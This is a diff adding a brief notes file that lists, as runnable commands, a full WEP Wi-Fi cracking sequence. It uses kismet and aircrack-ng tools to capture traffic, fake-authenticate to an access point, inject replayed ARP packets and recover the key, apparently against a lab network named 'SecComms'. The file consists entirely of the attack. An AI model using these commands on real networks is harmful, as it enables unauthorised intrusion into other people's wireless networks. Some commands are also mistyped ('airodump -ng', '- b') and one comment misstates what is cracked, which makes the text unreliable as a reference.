@@ -1,0 +1,17 @@
+# Check for hidden SSID using the MAC address
+kismet -c wlan0
+
+# Lock wireless interface to channel 9
+iwconfig wlan0 channel 9
+
+# Capture traffic .cap
+sudo airodump -ng -c 9 --bssid <MAC_ADDRESS> -w output wlan0
+
+# Fake authentication to associate AP so the sent packets are not ignored
+sudo aireplay-ng -1 0 -e SecComms -a <DEST_MAC_ADDRESS> -h <SOURCE_MAC_ADDRESS> wlan0
+
+# Listen to ARP request (MAC from IP adress) and then reinjects them back into the network to genereate IVs faster. These IVs are later used to crack the IP password
+sudo aireplay-ng -3 -b  <DEST_MAC_ADDRESS> -h <SOURCE_MAC_ADDRESS> wlan0
+
+# Crack password through PTW method using the captured traffic
+sudo aircrack-ng - b <DEST_MAC_ADDRESS> output*.cap
